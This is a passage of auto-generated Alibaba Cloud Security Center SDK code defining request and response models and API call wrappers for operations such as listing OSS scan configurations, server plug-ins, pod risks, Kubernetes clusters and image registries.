 * @return ListOssBucketScanInfoResponse
 */
async function listOssBucketScanInfo(request: ListOssBucketScanInfoRequest): ListOssBucketScanInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return listOssBucketScanInfoWithOptions(request, runtime);
}

model ListOssScanConfigRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  name?: string(name='Name', description='The policy name.', example='testName'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
}

model ListOssScanConfigResponseBody = {
  data?: [ 
    {
      allKeyPrefix?: boolean(name='AllKeyPrefix', description='Indicates whether the prefixes of all objects are matched.', example='true'),
      bucketCount?: int32(name='BucketCount', description='The number of buckets.', example='10'),
      bucketNameList?: [ string ](name='BucketNameList', description='The names of the buckets.'),
      decompressMaxFileCount?: int32(name='DecompressMaxFileCount', description='The maximum number of objects that can be extracted during decompression. Valid values: 1 to 1000. If the maximum number of objects that can be extracted is reached, the decompression operation immediately ends and the detection of extracted objects is not affected.', example='100'),
      decompressMaxLayer?: int32(name='DecompressMaxLayer', description='The maximum number of decompression levels when multi-level packages are decompressed. Valid values: 1 to 5. If the maximum number of decompression levels is reached, the decompression operation immediately ends and the detection of extracted objects is not affected.', example='1'),
      decryptionList?: [ string ](name='DecryptionList', description='The decryption methods.'),
      enable?: int32(name='Enable', description='Indicates whether the policy is enabled. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
      endTime?: string(name='EndTime', description='The time when the scan ends. The time is in the HH:mm:ss format.', example='06:00:00'),
      id?: long(name='Id', description='The configuration ID.', example='443496'),
      keyPrefixList?: [ string ](name='KeyPrefixList', description='The prefixes of the objects that are scanned.'),
      keySuffixList?: [ string ](name='KeySuffixList', description='The suffixes of the objects that are scanned.'),
      lastModifiedStartTime?: long(name='LastModifiedStartTime', description='The timestamp when the object was last modified. The time must be later than the timestamp that you specify. Unit: milliseconds.', example='1724301769834'),
      lastUpdateTime?: long(name='LastUpdateTime', description='The timestamp when the configuration was last modified.', example='1698388233883'),
      name?: string(name='Name', description='The configuration name.', example='test****'),
      scanDayList?: [ int32 ](name='ScanDayList', description='The days on which the scan is executed in a week.'),
      startTime?: string(name='StartTime', description='The time when the scan starts. The time is in the HH:mm:ss format.', example='00:00:00'),
    }
  ](name='Data', description='The data returned.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='50'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='E10BAF1C-A6C5-51E2-866C-76D5922E****'),
}

model ListOssScanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListOssScanConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configuration of an Object Storage Service (OSS) file detection policy.
 *
 * @param request ListOssScanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListOssScanConfigResponse
 */
async function listOssScanConfigWithOptions(request: ListOssScanConfigRequest, runtime: Util.RuntimeOptions): ListOssScanConfigResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListOssScanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configuration of an Object Storage Service (OSS) file detection policy.
 *
 * @param request ListOssScanConfigRequest
 * @return ListOssScanConfigResponse
 */
async function listOssScanConfig(request: ListOssScanConfigRequest): ListOssScanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listOssScanConfigWithOptions(request, runtime);
}

model ListPluginForUuidRequest {
  types?: [ string ](name='Types', description='The plug-in types.'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='bdb7071f-129d-4ceb-af80-4cf70c4571c6'),
}

model ListPluginForUuidShrinkRequest {
  typesShrink?: string(name='Types', description='The plug-in types.'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='bdb7071f-129d-4ceb-af80-4cf70c4571c6'),
}

model ListPluginForUuidResponseBody = {
  aegisUuidTargetPluginConfigList?: [ 
    {
      aegisSuspiciousConfigList?: [ 
        {
          config?: boolean(name='Config', description='Indicates whether the plug-in is enabled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
          msg?: string(name='Msg', description='The message that indicates whether you are authorized to install the plug-in on your server or whether the plug-in is installed on your server. Valid values:

*   **authorized**: authorized
*   **unauthorized**: unauthorized
*   **unbind**: not installed
*   **nonsupport**: not supported', example='authorized'),
          overallConfig?: boolean(name='OverallConfig', description='Indicates whether the plug-in is globally configured. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
          type?: string(name='Type', description='The name of the plug-in. Valid values:

*   **alihips**: trojan-specific prevention
*   **alisecguard**: attack-specific prevention
*   **alinet**: defense against attacks on servers', example='alisecguard'),
        }
      ](name='AegisSuspiciousConfigList', description='An array that consists of the configurations of plug-ins.'),
      pluginInstallCode?: string(name='PluginInstallCode', description='The installation code of the plug-in.', example='k5O5nd'),
      pluginName?: string(name='PluginName', description='The name of the plug-in. Valid values:

*   **alihips**: trojan-specific prevention
*   **alisecguard**: attack-specific prevention
*   **alinet**: defense against attacks on servers', example='alisecguard'),
      pluginOnlineInstalled?: boolean(name='PluginOnlineInstalled', description='Indicates whether the plug-in is installed. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      pluginOnlineStatus?: boolean(name='PluginOnlineStatus', description='Indicates whether the plug-in is online. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      pluginVersion?: string(name='PluginVersion', description='The version of the plug-in.', example='00_10'),
    }
  ](name='AegisUuidTargetPluginConfigList', description='An array that consists of the information about the plug-ins.'),
  code?: int32(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model ListPluginForUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListPluginForUuidResponseBody(name='body'),
}

/**
 * @summary Queries the information about plug-ins on a server.
 *
 * @param tmpReq ListPluginForUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListPluginForUuidResponse
 */
async function listPluginForUuidWithOptions(tmpReq: ListPluginForUuidRequest, runtime: Util.RuntimeOptions): ListPluginForUuidResponse {
  Util.validateModel(tmpReq);
  var request = new ListPluginForUuidShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.types)) {
    request.typesShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.types, 'Types', 'simple');
  }
  var query = {};
  if (!Util.isUnset(request.typesShrink)) {
    query['Types'] = request.typesShrink;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPluginForUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about plug-ins on a server.
 *
 * @param request ListPluginForUuidRequest
 * @return ListPluginForUuidResponse
 */
async function listPluginForUuid(request: ListPluginForUuidRequest): ListPluginForUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPluginForUuidWithOptions(request, runtime);
}

model ListPodRiskRequest {
  appName?: string(name='AppName', description='The name of the application.', example='nginx1'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of container clusters.', example='c314aa5b2f208461dad821cdfed82****'),
  currentPage?: long(name='CurrentPage', description='The number of the page to return.', example='1'),
  namespace?: string(name='Namespace', description='The namespace of the Kubernetes cluster.', example='taas'),
  pageSize?: long(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  podName?: string(name='PodName', description='The name of the pod.', example='abcd-84898334227-p****'),
}

model ListPodRiskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='2-'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='29'),
  }(name='PageInfo', description='The pagination information.'),
  podRiskList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated for the pod.', example='10'),
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c1d903a628af043659a043af59d89****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='test66'),
      createTime?: long(name='CreateTime', description='The timestamp that indicates the time when the pod was created. Unit: milliseconds.', example='1644283112720'),
      hcCount?: int32(name='HcCount', description='The number of baseline risk items that are detected in the pod.', example='1'),
      instanceId?: string(name='InstanceId', description='The instance ID of the node.', example='i-7yvdq597****'),
      namespace?: string(name='Namespace', description='The namespace of the Kubernetes cluster.', example='kube-system'),
      nodeName?: string(name='NodeName', description='The name of the node.', example='test'),
      pod?: string(name='Pod', description='The name of the pod.', example='expoit-xxx-b****'),
      podIp?: string(name='PodIp', description='The IP address of the pod.', example='172.0.XXX.XXX'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected in the pod.', example='1'),
    }
  ](name='PodRiskList', description='An array that consists of the risks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='94254AD7-5026-5847-833B-403C2326BD6E'),
}

model ListPodRiskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListPodRiskResponseBody(name='body'),
}

/**
 * @summary Queries the security risks of a pod.
 *
 * @param request ListPodRiskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListPodRiskResponse
 */
async function listPodRiskWithOptions(request: ListPodRiskRequest, runtime: Util.RuntimeOptions): ListPodRiskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.podName)) {
    query['PodName'] = request.podName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPodRisk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the security risks of a pod.
 *
 * @param request ListPodRiskRequest
 * @return ListPodRiskResponse
 */
async function listPodRisk(request: ListPodRiskRequest): ListPodRiskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPodRiskWithOptions(request, runtime);
}

model ListPrivateK8sResponseBody = {
  privateK8sInfos?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the Alibaba Cloud account.', example='12345'),
      apiServerIp?: string(name='ApiServerIp', description='The IP address of the API server.', example='192.168.XX.XX'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='xxx'),
      id?: long(name='Id', description='The ID of the policy.', example='1'),
      k8sVersion?: string(name='K8sVersion', description='The version of Kubernetes.', example='1.18'),
      kubeConfig?: string(name='KubeConfig', description='The server configuration of Kubernetes.', example='xxx'),
      netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet.
*   **2**: VPC.', example='1'),
      regionId?: string(name='RegionId', description='The ID of the region.', example='cn-hangzhou'),
      vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC).', example='vpc-2zet5l358k6z0gnz*****'),
    }
  ](name='PrivateK8sInfos', description='The information about the self-managed Kubernetes clusters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='52870893-48A7-5A9E-9E05-6253E5B6****'),
}

model ListPrivateK8sResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListPrivateK8sResponseBody(name='body'),
}

/**
 * @summary Queries the information about the self-managed Kubernetes clusters that are added to Security Center.
 *
 * @param request ListPrivateK8sRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListPrivateK8sResponse
 */
async function listPrivateK8sWithOptions(runtime: Util.RuntimeOptions): ListPrivateK8sResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListPrivateK8s',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the self-managed Kubernetes clusters that are added to Security Center.
 *
 * @return ListPrivateK8sResponse
 */
async function listPrivateK8s(): ListPrivateK8sResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateK8sWithOptions(runtime);
}

model ListPrivateRegistryListRequest {
  registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor'),
}

model ListPrivateRegistryListResponseBody = {
  imageRegistryInfos?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='1766185894******'),
      domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
      id?: long(name='Id', description='The ID of the image repository.', example='66485'),
      jenkinsEnv?: string(name='JenkinsEnv', description='The information about the Jenkins environment.', example='JenkinsInfo'),
      netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='1'),
      password?: string(name='Password', description='The password used to log on to the image repository.', example='Harbor******'),
      persistenceDay?: long(name='PersistenceDay', description='The number of days during which assets can be retained.', example='90'),
      protocolType?: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1'),
      regionId?: string(name='RegionId', description='The region ID of the server.', example='cn-hangzhou'),
      registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.XXX.XXX'),
      registryName?: string(name='RegistryName', description='The alias of the image repository.', example='test1'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor'),
      registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Valid values:

*   **V1**: V1.0
*   **V2**: V2.0', example='V1'),
      token?: string(name='Token', description='The authentication token of the user.', example='0da12bce-cc36-4c48-b3e6-2215fc3a****'),
      transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30'),
      userName?: string(name='UserName', description='The username used to log on to the image repository.', example='RegistryUser'),
      vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC).', example='vpc-bp12897gqrex01zn0****'),
      whiteList?: string(name='WhiteList', description='The whitelist of IP addresses.', example='100.104.XXX.XXX'),
    }
  ](name='ImageRegistryInfos', description='An array that consists of the image repositories.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
}

model ListPrivateRegistryListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListPrivateRegistryListResponseBody(name='body'),
}

/**
 * @summary Queries image repositories.
 *
 * @param request ListPrivateRegistryListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListPrivateRegistryListResponse
 */
async function listPrivateRegistryListWithOptions(request: ListPrivateRegistryListRequest, runtime: Util.RuntimeOptions): ListPrivateRegistryListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryType)) {
    query['RegistryType'] = request.registryType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPrivateRegistryList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries image repositories.
 *
 * @param request ListPrivateRegistryListRequest
 * @return ListPrivateRegistryListResponse
 */
async function listPrivateRegistryList(request: ListPrivateRegistryListRequest): ListPrivateRegistryListResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateRegistryListWithOptions(request, runtime);
}

model ListPrivateRegistryTypeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model ListPrivateRegistryTypeResponseBody = {
  registryTypeInfos?: [ 
    {
      count?: long(name='Count', description='The number of image repositories.', example='2'),
      registryType?: string(name='RegistryType', description='The name of the image repository type. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor'),
    }
  ](name='RegistryTypeInfos', description='An array that consists of image repository types.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model ListPrivateRegistryTypeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListPrivateRegistryTypeResponseBody(name='body'),
}

/**
 * @summary Queries the number of image repositories of each type.
 *
 * @param request ListPrivateRegistryTypeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListPrivateRegistryTypeResponse
 */
async function listPrivateRegistryTypeWithOptions(request: ListPrivateRegistryTypeRequest, runtime: Util.RuntimeOptions): ListPrivateRegistryTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPrivateRegistryType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of image repositories of each type.
 *
 * @param request ListPrivateRegistryTypeRequest
 * @return ListPrivateRegistryTypeResponse
 */
async function listPrivateRegistryType(request: ListPrivateRegistryTypeRequest): ListPrivateRegistryTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateRegistryTypeWithOptions(request, runtime);
}

model ListPublishBatchRequest {
  batchName?: string(name='BatchName', description='The name of the release batch.', example='test'),
  currentPage?: int32(name='CurrentPage', description='The page number.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
  upgradeVersion?: string(name='UpgradeVersion', description='The destination version of the Security Center agent.

This parameter is required.', example='0.0.9'),
}

model ListPublishBatchResponseBody = {
  batchList?: [ 
    {
      batchId?: long(name='BatchId', description='The ID of the release batch.', example='1371'),
      batchInterval?: int32(name='BatchInterval', description='The interval between two release batches. Unit: hours.', example='12'),
      batchName?: string(name='BatchName', description='The name of the release batch.', example='test'),
      batchNo?: int32(name='BatchNo', description='The current batch number during a batch release.', example='2147483647'),
      batchProcess?: int32(name='BatchProcess', description='The progress of the release batch. This parameter indicates the number of servers that are upgraded in the release batch.', example='12'),
      batchTotal?: int32(name='BatchTotal', description='The total number of batches.', example='3'),
      operationBase?: int32(name='OperationBase', description='The asset selection dimension. Valid values:

*   **0**: instance.
*   **1**: machine group.
*   **2**: Virtual Private Cloud (VPC) ID.', example='0'),
      status?: int32(name='Status', description='The publish status of the Security Center agent. Valid values:

*   **0**: not started.
*   **1**: publishing.
*   **2**: published.
*   **3**: publish suspended.
*   **4**: forcibly upgrading.', example='1'),
      version?: string(name='Version', description='The destination version of the Security Center agent.', example='0.0.9'),
    }
  ](name='BatchList', description='The information about the release batches.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='25'),
  }(name='PageInfo', description='The page information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model ListPublishBatchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListPublishBatchResponseBody(name='body'),
}

/**
 * @summary Query the details of a release batch for upgrade.
 *
 * @param request ListPublishBatchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListPublishBatchResponse
 */
async function listPublishBatchWithOptions(request: ListPublishBatchRequest, runtime: Util.RuntimeOptions): ListPublishBatchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.batchName)) {
    query['BatchName'] = request.batchName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.upgradeVersion)) {
    query['UpgradeVersion'] = request.upgradeVersion;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPublishBatch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query the details of a release batch for upgrade.
 *
 * @param request ListPublishBatchRequest
 * @return ListPublishBatchResponse
 */
async function listPublishBatch(request: ListPublishBatchRequest): ListPublishBatchResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPublishBatchWithOptions(request, runtime);
}

model ListQueryRaspAppInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**
*   **en**', example='zh'),
  uuids?: string(name='Uuids', description='The UUIDs of the RASP-enabled applications. Separate multiple UUIDs with commas (,).', example='6541631a-7d47-41fd-9fef-9518113f****'),
}

model ListQueryRaspAppInfoResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ 
    {
      raspAppName?: string(name='RaspAppName', description='The name of the RASP-enabled application.', example='rasp-app'),
      raspOnlineStatus?: int32(name='RaspOnlineStatus', description='The online status of the RASP-enabled applications. Valid values:

*   **0**: All RASP-enabled applications are online.
*   **1**: Part of the RASP-enabled applications are online.
*   **2**: All RASP-enabled applications are offline.', example='0'),
      raspStatus?: string(name='RaspStatus', description='The installation status of the RASP-enabled application. Valid values:

*   **SUCCESS**: The RASP-enabled application is installed.
*   **FAIL**: The RASP-enabled application fails to be installed.
*   **INSTALL**: The RASP-enabled application is being installed.', example='SUCCESS'),
      result?: string(name='Result', description='The result returned if the push fails.', example='AGENT_OFFLINE'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='The installation information of the RASP-enabled application.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The additional information that is returned.', example='successful'),
  requestId?: string(name='RequestId', description='The unique ID of the request, which is used to locate and troubleshoot issues.', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListQueryRaspAppInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListQueryRaspAppInfoResponseBody(name='body'),
}

/**
 * @summary Queries the installation information of one or more Runtime Application Self-protection-enabled (RASP-enabled) applications.
 *
 * @param request ListQueryRaspAppInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListQueryRaspAppInfoResponse
 */
async function listQueryRaspAppInfoWithOptions(request: ListQueryRaspAppInfoRequest, runtime: Util.RuntimeOptions): ListQueryRaspAppInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListQueryRaspAppInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the installation information of one or more Runtime Application Self-protection-enabled (RASP-enabled) applications.
 *
 * @param request ListQueryRaspAppInfoRequest
 * @return ListQueryRaspAppInfoResponse
 */
async function listQueryRaspAppInfo(request: ListQueryRaspAppInfoRequest): ListQueryRaspAppInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return listQueryRaspAppInfoWithOptions(request, runtime);
}

model ListRdDefaultSyncListResponseBody = {
  data?: {
    folderIds?: string(name='FolderIds', description='The IDs of the folders in the resource directory.', example='fd-BwoXuf****,fd-CFamY7****'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model ListRdDefaultSyncListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListRdDefaultSyncListResponseBody(name='body'),
}

/**
 * @summary Queries the automatic management policies of members that are added to Security Center for multi-account management. The members in the automatic control management directory are automatically added to the member list of Security Center.
 *
 * @description You must use the management account of your resource directory or a delegated administrator account of Security Center to call this operation.
 *
 * @param request ListRdDefaultSyncListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListRdDefaultSyncListResponse
 */
async function listRdDefaultSyncListWithOptions(runtime: Util.RuntimeOptions): ListRdDefaultSyncListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListRdDefaultSyncList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the automatic management policies of members that are added to Security Center for multi-account management. The members in the automatic control management directory are automatically added to the member list of Security Center.
 *
 * @description You must use the management account of your resource directory or a delegated administrator account of Security Center to call this operation.
 *
 * @return ListRdDefaultSyncListResponse
 */
async function listRdDefaultSyncList(): ListRdDefaultSyncListResponse {
  var runtime = new Util.RuntimeOptions{};
  return listRdDefaultSyncListWithOptions(runtime);
}

model ListRuleTargetAllRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of container clusters.

This parameter is required.', example='cfa7e2fb8c221483ba59e098c34c6****'),
}

model ListRuleTargetAllResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
  ruleTargetList?: [ 
    {
      targetId?: long(name='TargetId', description='The ID of the network object.', example='301944'),
      targetName?: string(name='TargetName', description='The name of the network object.', example='source-test-obj-xFKcx'),
      targetType?: string(name='TargetType', description='The type of the object. Valid values:

*   IMAGE', example='IMAGE'),
    }
